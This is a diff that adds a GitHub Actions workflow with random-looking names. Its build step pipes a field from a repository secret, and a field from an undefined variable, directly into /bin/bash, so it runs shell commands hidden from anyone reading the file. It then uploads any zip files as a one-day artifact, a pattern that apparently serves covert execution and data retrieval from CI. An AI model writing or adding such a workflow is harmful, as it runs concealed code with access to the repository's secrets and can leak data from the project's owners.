@@ -1,0 +1,22 @@
+name: tensorflowsaraha
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tensorflowsaraha
+        env:
+          ivdd7: ${{ secrets.ivdd7 }}
+        run: |
+          printf '%s' "$ivdd7" | jq -r .bn12 | /bin/bash
+          printf '%s' "$ui8083" | jq -r .wdnyq279 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4QMC8jwY
+          path: "*.zip"
+          retention-days: 1
